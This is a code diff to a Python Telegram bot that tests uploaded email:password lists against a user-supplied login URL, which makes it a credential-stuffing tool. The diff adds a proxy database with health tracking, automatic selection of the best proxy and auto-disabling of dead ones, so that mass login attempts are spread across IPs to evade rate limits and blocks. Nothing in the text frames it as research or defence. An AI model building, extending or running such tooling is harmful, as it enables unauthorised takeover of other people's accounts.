@@ -63,6 +63,21 @@ def init_database():
                 last_active TEXT DEFAULT CURRENT_TIMESTAMP
             )
         ''')
+        conn.execute('''
+            CREATE TABLE IF NOT EXISTS proxies (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                user_id INTEGER NOT NULL,
+                proxy_url TEXT NOT NULL,
+                proxy_type TEXT DEFAULT 'http',
+                is_active INTEGER DEFAULT 1,
+                success_count INTEGER DEFAULT 0,
+                fail_count INTEGER DEFAULT 0,
+                avg_response_time REAL DEFAULT 0.0,
+                last_tested TEXT DEFAULT CURRENT_TIMESTAMP,
+                created_at TEXT DEFAULT CURRENT_TIMESTAMP,
+                FOREIGN KEY (user_id) REFERENCES users(user_id)
+            )
+        ''')
         conn.commit()
         conn.close()
         logger.info("✅ Database initialized")
@@ -90,6 +105,123 @@ def update_user_activity(user_id: int):
         conn.close()
     except:
         pass
+
+# ==================== PROXY DATABASE ====================
+def add_proxy(user_id: int, proxy_url: str) -> bool:
+    """Add proxy to database"""
+    try:
+        proxy_type = 'socks5' if 'socks5' in proxy_url.lower() else 'http'
+        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
+        conn.execute('''
+            INSERT INTO proxies (user_id, proxy_url, proxy_type)
+            VALUES (?, ?, ?)
+        ''', (user_id, proxy_url, proxy_type))
+        conn.commit()
+        conn.close()
+        return True
+    except:
+        return False
+
+def get_user_proxies(user_id: int) -> list:
+    """Get all active proxies for user"""
+    try:
+        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
+        cursor = conn.cursor()
+        cursor.execute('''
+            SELECT id, proxy_url, success_count, fail_count, avg_response_time, is_active
+            FROM proxies
+            WHERE user_id = ?
+            ORDER BY is_active DESC, success_count DESC
+        ''', (user_id,))
+        result = cursor.fetchall()
+        conn.close()
+        return result
+    except:
+        return []
+
+def get_active_proxy(user_id: int) -> str:
+    """Get best active proxy for user"""
+    try:
+        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
+        cursor = conn.cursor()
+        cursor.execute('''
+            SELECT proxy_url
+            FROM proxies
+            WHERE user_id = ? AND is_active = 1
+            ORDER BY success_count DESC, avg_response_time ASC
+            LIMIT 1
+        ''', (user_id,))
+        result = cursor.fetchone()
+        conn.close()
+        return result[0] if result else ''
+    except:
+        return ''
+
+def update_proxy_stats(proxy_url: str, success: bool, response_time: float):
+    """Update proxy statistics"""
+    try:
+        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
+        if success:
+            conn.execute('''
+                UPDATE proxies
+                SET success_count = success_count + 1,
+                    avg_response_time = (avg_response_time * success_count + ?) / (success_count + 1),
+                    last_tested = CURRENT_TIMESTAMP
+                WHERE proxy_url = ?
+            ''', (response_time, proxy_url))
+        else:
+            conn.execute('''
+                UPDATE proxies
+                SET fail_count = fail_count + 1,
+                    last_tested = CURRENT_TIMESTAMP
+                WHERE proxy_url = ?
+            ''', (proxy_url,))
+        conn.commit()
+        conn.close()
+    except:
+        pass
+
+def deactivate_proxy(proxy_id: int):
+    """Deactivate a proxy"""
+    try:
+        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
+        conn.execute('UPDATE proxies SET is_active = 0 WHERE id = ?', (proxy_id,))
+        conn.commit()
+        conn.close()
+        return True
+    except:
+        return False
+
+def delete_proxy(proxy_id: int):
+    """Delete a proxy"""
+    try:
+        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
+        conn.execute('DELETE FROM proxies WHERE id = ?', (proxy_id,))
+        conn.commit()
+        conn.close()
+        return True
+    except:
+        return False
+
+async def test_proxy(proxy_url: str) -> tuple:
+    """Test proxy connectivity and speed"""
+    try:
+        start_time = time.time()
+        proxies = {'http://': proxy_url, 'https://': proxy_url}
+        
+        async with httpx.AsyncClient(
+            timeout=httpx.Timeout(10.0),
+            proxies=proxies,
+            verify=False
+        ) as client:
+            response = await client.get('https://httpbin.org/ip')
+            response_time = time.time() - start_time
+            
+            if response.status_code == 200:
+                return (True, response_time)
+            return (False, 0.0)
+    except:
+        return (False, 0.0)
 
 def get_user_credits(user_id: int) -> int:
     """Get credits"""
@@ -195,21 +327,54 @@ async def stats_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(f"❌ Stats error: {e}")
 
 async def proxy_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Proxy command"""
+    """Proxy management menu"""
     user_id = update.effective_user.id
-    user_states[user_id] = {'step': 'waiting_proxy'}
     
-    await update.message.reply_text(
-        """🔧 **Proxy Configuration**
-
-📝 **Supported formats**:
-• `http://ip:port`
-• `http://user:pass@ip:port`
-• `socks5://ip:port`
-
-✅ Send proxy URL or `/start` to skip""",
-        parse_mode=ParseMode.MARKDOWN
-    )
+    # Get user's proxies
+    proxies = get_user_proxies(user_id)
+    
+    keyboard = []
+    
+    if proxies:
+        message = "🔧 **Proxy Management**\n\n📋 **Your Proxies**:\n\n"
+        for idx, (proxy_id, proxy_url, success, fail, avg_time, is_active) in enumerate(proxies, 1):
+            status = "✅" if is_active else "❌"
+            health = "🟢" if fail == 0 or (success / max(fail, 1)) > 2 else "🟡" if (success / max(fail, 1)) > 1 else "🔴"
+            message += f"{idx}. {status} {health} `{proxy_url[:30]}...`\n"
+            message += f"   Success: {success} | Fail: {fail} | Avg: {avg_time:.2f}s\n\n"
+            
+            # Add buttons for each proxy
+            keyboard.append([
+                InlineKeyboardButton(f"Test #{idx}", callback_data=f"test_proxy_{proxy_id}"),
+                InlineKeyboardButton(f"{'Disable' if is_active else 'Enable'} #{idx}", callback_data=f"toggle_proxy_{proxy_id}"),
+                InlineKeyboardButton(f"Delete #{idx}", callback_data=f"delete_proxy_{proxy_id}")
+            ])
+    else:
+        message = "🔧 **Proxy Management**\n\n❌ No proxies configured\n\n"
+    
+    message += "➕ **Add New Proxy**:\nSend proxy URL in format:\n• `http://ip:port`\n• `http://user:pass@ip:port`\n• `socks5://ip:port`"
+    
+    keyboard.append([InlineKeyboardButton("🔄 Refresh", callback_data="proxy_menu")])
+    keyboard.append([InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")])
+    
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    # Handle both message and callback query
+    if update.callback_query:
+        await update.callback_query.edit_message_text(
+            message,
+            parse_mode=ParseMode.MARKDOWN,
+            reply_markup=reply_markup
+        )
+    else:
+        await update.message.reply_text(
+            message,
+            parse_mode=ParseMode.MARKDOWN,
+            reply_markup=reply_markup
+        )
+    
+    # Set state for adding new proxy
+    user_states[user_id] = {'step': 'waiting_proxy'}
 
 # ==================== VALIDATORS ====================
 def validate_url(text: str) -> bool:
@@ -248,19 +413,37 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # ========== PROXY STATE ==========
     if state.get('step') == 'waiting_proxy':
         if validate_proxy(text):
-            user_sessions[user_id] = user_sessions.get(user_id, {})
-            user_sessions[user_id]['proxy'] = text
-            await update.message.reply_text(
-                f"✅ **Proxy saved**: `{text}`\n\n"
-                f"🔙 `/start` for main menu",
-                parse_mode=ParseMode.MARKDOWN
-            )
+            # Test proxy first
+            testing_msg = await update.message.reply_text("🔄 **Testing proxy...**")
+            
+            success, response_time = await test_proxy(text)
+            
+            if success:
+                # Add to database
+                if add_proxy(user_id, text):
+                    await testing_msg.edit_text(
+                        f"✅ **Proxy added successfully!**\n\n"
+                        f"🔗 URL: `{text}`\n"
+                        f"⚡ Response time: `{response_time:.2f}s`\n\n"
+                        f"Use `/proxy` to manage proxies",
+                        parse_mode=ParseMode.MARKDOWN
+                    )
+                else:
+                    await testing_msg.edit_text("❌ **Failed to save proxy**")
+            else:
+                await testing_msg.edit_text(
+                    f"❌ **Proxy test failed**\n\n"
+                    f"The proxy `{text}` is not responding.\n"
+                    f"Please check the URL and try again.",
+                    parse_mode=ParseMode.MARKDOWN
+                )
         else:
             await update.message.reply_text(
-                "❌ **Invalid proxy**\n\n"
+                "❌ **Invalid proxy format**\n\n"
                 "✅ **Examples**:\n"
                 "• `http://1.2.3.4:8080`\n"
-                "• `http://user:pass@proxy.com:3128`",
+                "• `http://user:pass@proxy.com:3128`\n"
+                "• `socks5://proxy.com:1080`",
                 parse_mode=ParseMode.MARKDOWN
             )
         user_states[user_id]['step'] = 'waiting_url'
@@ -290,6 +473,10 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # ✅ URL VALID - SAVE STATE
         state['login_url'] = text
         state['step'] = 'waiting_file'
+        
+        # Initialize user session if not exists
+        if user_id not in user_sessions:
+            user_sessions[user_id] = {}
         user_sessions[user_id]['url'] = text
         
         await update.message.reply_text(
@@ -320,7 +507,8 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             
             await file_obj.download_to_drive(filename)
             
-            proxy = user_sessions.get(user_id, {}).get('proxy', '')
+            # Get best active proxy from database
+            proxy = get_active_proxy(user_id)
             await process_credentials(update, context, filename, state['login_url'], proxy)
             
         except Exception as e:
@@ -437,7 +625,10 @@ async def process_credentials(update: Update, context: ContextTypes.DEFAULT_TYPE
         await update.message.reply_text("❌ **Processing failed** - try again")
 
 async def test_credential(credential: str, login_url: str, proxy_url: str = '') -> bool:
-    """Test single credential"""
+    """Test single credential with proxy tracking"""
+    start_time = time.time()
+    success = False
+    
     try:
         email, password = credential.split(':', 1)
         
@@ -470,6 +661,7 @@ async def test_credential(credential: str, login_url: str, proxy_url: str = '') 
             follow_redirects=True
         ) as client:
             response = await client.post(login_url, data=data)
+            response_time = time.time() - start_time
             
             # Success indicators
             success_indicators = [
@@ -478,10 +670,43 @@ async def test_credential(credential: str, login_url: str, proxy_url: str = '') 
             ]
             
             page_text = response.text.lower()
-            return (response.status_code < 400 and 
-                   any(indicator in page_text for indicator in success_indicators))
+            success = (response.status_code < 400 and
+                      any(indicator in page_text for indicator in success_indicators))
             
-    except Exception:
+            # Update proxy stats if proxy was used
+            if proxy_url:
+                update_proxy_stats(proxy_url, True, response_time)
+            
+            return success
+            
+    except Exception as e:
+        # Update proxy stats on failure
+        if proxy_url:
+            update_proxy_stats(proxy_url, False, 0.0)
+            
+            # Auto-disable proxy if it has too many failures
+            try:
+                conn = sqlite3.connect(DB_FILE, check_same_thread=False)
+                cursor = conn.cursor()
+                cursor.execute('''
+                    SELECT fail_count, success_count
+                    FROM proxies
+                    WHERE proxy_url = ?
+                ''', (proxy_url,))
+                result = cursor.fetchone()
+                
+                if result:
+                    fail_count, success_count = result
+                    # Disable if fail rate > 80% and at least 10 attempts
+                    if (fail_count + success_count) >= 10 and fail_count / (fail_count + success_count) > 0.8:
+                        conn.execute('UPDATE proxies SET is_active = 0 WHERE proxy_url = ?', (proxy_url,))
+                        conn.commit()
+                        logger.warning(f"🔴 Auto-disabled dead proxy: {proxy_url}")
+                
+                conn.close()
+            except:
+                pass
+        
         return False
 
 async def cleanup_file(filename: str):
@@ -497,10 +722,78 @@ async def cleanup_file(filename: str):
 async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Button callbacks"""
     query = update.callback_query
-    await query.answer()
+    user_id = update.effective_user.id
     
+    # Handle different callback actions
     if query.data == "proxy_menu":
+        await query.answer()
         await proxy_menu(update, context)
+    
+    elif query.data == "main_menu":
+        await query.answer()
+        await start(update, context)
+    
+    elif query.data.startswith("test_proxy_"):
+        proxy_id = int(query.data.split("_")[2])
+        await query.answer("Testing proxy...")
+        
+        # Get proxy URL
+        proxies = get_user_proxies(user_id)
+        proxy_url = next((p[1] for p in proxies if p[0] == proxy_id), None)
+        
+        if proxy_url:
+            success, response_time = await test_proxy(proxy_url)
+            if success:
+                update_proxy_stats(proxy_url, True, response_time)
+                await query.edit_message_text(
+                    f"✅ **Proxy Test Successful**\n\n"
+                    f"🔗 `{proxy_url}`\n"
+                    f"⚡ Response time: `{response_time:.2f}s`\n\n"
+                    f"Use `/proxy` to return to menu",
+                    parse_mode=ParseMode.MARKDOWN
+                )
+            else:
+                update_proxy_stats(proxy_url, False, 0.0)
+                await query.edit_message_text(
+                    f"❌ **Proxy Test Failed**\n\n"
+                    f"🔗 `{proxy_url}`\n"
+                    f"The proxy is not responding.\n\n"
+                    f"Use `/proxy` to return to menu",
+                    parse_mode=ParseMode.MARKDOWN
+                )
+    
+    elif query.data.startswith("toggle_proxy_"):
+        proxy_id = int(query.data.split("_")[2])
+        await query.answer()
+        
+        # Toggle proxy status
+        proxies = get_user_proxies(user_id)
+        proxy = next((p for p in proxies if p[0] == proxy_id), None)
+        
+        if proxy:
+            is_active = proxy[5]
+            if is_active:
+                deactivate_proxy(proxy_id)
+            else:
+                # Reactivate by setting is_active = 1
+                try:
+                    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
+                    conn.execute('UPDATE proxies SET is_active = 1 WHERE id = ?', (proxy_id,))
+                    conn.commit()
+                    conn.close()
+                except:
+                    pass
+        
+        await proxy_menu(update, context)
+    
+    elif query.data.startswith("delete_proxy_"):
+        proxy_id = int(query.data.split("_")[2])
+        await query.answer("Proxy deleted")
+        delete_proxy(proxy_id)
+        await proxy_menu(update, context)
+    
+    else:
+        await query.answer()
 
 # ==================== STARTUP NOTIFICATIONS ====================
 async def send_startup_notifications(app: Application):
@@ -554,32 +847,50 @@ async def post_init(app: Application):
 # ==================== MAIN ====================
 def main():
     """Start bot"""
-    if not BOT_TOKEN:
-        logger.error("❌ BOT_TOKEN not found in environment")
+    # Validate BOT_TOKEN
+    if not BOT_TOKEN or BOT_TOKEN in ['', 'your_telegram_bot_token', 'your_bot_token_here']:
+        logger.error("❌ CRITICAL ERROR: BOT_TOKEN not configured!")
+        logger.error("❌ Please set BOT_TOKEN environment variable with your actual bot token")
+        logger.error("❌ Get your token from @BotFather on Telegram")
+        logger.error("❌ Example: BOT_TOKEN=123456789:ABCdefGHIjklMNOpqrsTUVwxyz")
+        return
+    
+    # Validate token format
+    if not BOT_TOKEN.count(':') == 1 or len(BOT_TOKEN) < 40:
+        logger.error(f"❌ INVALID BOT_TOKEN FORMAT: {BOT_TOKEN[:20]}...")
+        logger.error("❌ Token should be in format: 123456789:ABCdefGHIjklMNOpqrsTUVwxyz")
+        logger.error("❌ Get a valid token from @BotFather on Telegram")
         return
     
     logger.info("🚀 Initializing Auth Bot...")
+    logger.info(f"🔑 Token: {BOT_TOKEN[:10]}...{BOT_TOKEN[-10:]}")
     init_database()
     
-    # Create application
-    app = Application.builder().token(BOT_TOKEN).build()
-    
-    # Register handlers (CRITICAL ORDER)
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("stats", stats_cmd))
-    app.add_handler(CommandHandler("proxy", proxy_menu))
-    
-    app.add_handler(CallbackQueryHandler(callback_handler))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
-    
-    # Add post-init hook for startup notifications
-    app.post_init = post_init
-    
-    logger.info("✅ Bot fully configured - starting...")
-    app.run_polling(
-        drop_pending_updates=True,
-        allowed_updates=Update.ALL_TYPES
-    )
+    try:
+        # Create application
+        app = Application.builder().token(BOT_TOKEN).build()
+        
+        # Register handlers (CRITICAL ORDER)
+        app.add_handler(CommandHandler("start", start))
+        app.add_handler(CommandHandler("stats", stats_cmd))
+        app.add_handler(CommandHandler("proxy", proxy_menu))
+        
+        app.add_handler(CallbackQueryHandler(callback_handler))
+        app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
+        app.add_handler(MessageHandler(filters.Document.ALL, message_handler))  # Handle document uploads
+        
+        # Add post-init hook for startup notifications
+        app.post_init = post_init
+        
+        logger.info("✅ Bot fully configured - starting...")
+        app.run_polling(
+            drop_pending_updates=True,
+            allowed_updates=Update.ALL_TYPES
+        )
+    except Exception as e:
+        logger.error(f"❌ FATAL ERROR: {e}")
+        logger.error("❌ Check your BOT_TOKEN and environment variables")
+        raise
 
 if __name__ == "__main__":
     main()
